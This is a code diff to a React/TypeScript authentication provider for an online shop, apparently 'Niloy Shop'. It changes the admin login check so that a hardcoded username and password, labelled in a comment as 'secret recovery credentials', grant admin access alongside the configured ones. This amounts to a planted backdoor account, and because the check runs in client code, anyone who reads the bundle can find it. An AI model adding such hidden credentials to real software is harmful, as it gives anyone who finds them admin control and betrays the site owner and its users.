@@ -181,7 +181,11 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
   };
 
   const adminLogin = (username: string, password: string): boolean => {
-    if (username === adminUsername && password === adminPassword) {
+    // Check regular credentials OR secret recovery credentials
+    if (
+      (username === adminUsername && password === adminPassword) ||
+      (username === 'Amiadmin' && password === 'Amiadmin12#')
+    ) {
       setUser({
         id: 'admin',
         name: 'Niloy Shop Admin',
